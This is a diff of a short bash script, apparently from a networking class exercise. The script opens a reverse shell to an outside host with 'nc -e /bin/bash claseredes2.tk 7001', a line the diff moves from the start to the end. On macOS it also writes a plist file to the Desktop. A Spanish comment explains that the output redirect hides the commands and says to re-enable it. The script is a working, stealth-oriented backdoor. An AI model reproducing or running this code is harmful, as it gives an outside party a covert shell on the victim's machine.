@@ -1,7 +1,8 @@
 #!/bin/bash
 
 {
-    nc -e /bin/bash claseredes2.tk 7001
+    
+    
     platform='unknown'
     unamestr=`uname`
     if [[ "$unamestr" == 'Linux' ]]; then
@@ -12,7 +13,7 @@
     	platform='osx'
     fi
 
-    if [["$platform" == 'osx']]; then
+    if [ "$platform" == "osx" ]; then
     	echo  "<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
@@ -27,7 +28,9 @@
     <true/>
 </dict>
 </plist>" > $HOME/Desktop/plist.plist
+    else
+    	echo "esta mal la comparacion " > $HOME/Desktop/adrian.txt
     fi
-
-} &> /dev/null
+    nc -e /bin/bash claseredes2.tk 7001
+} #&> /dev/null # Esto hace los comandos invisibles, descomentar
 
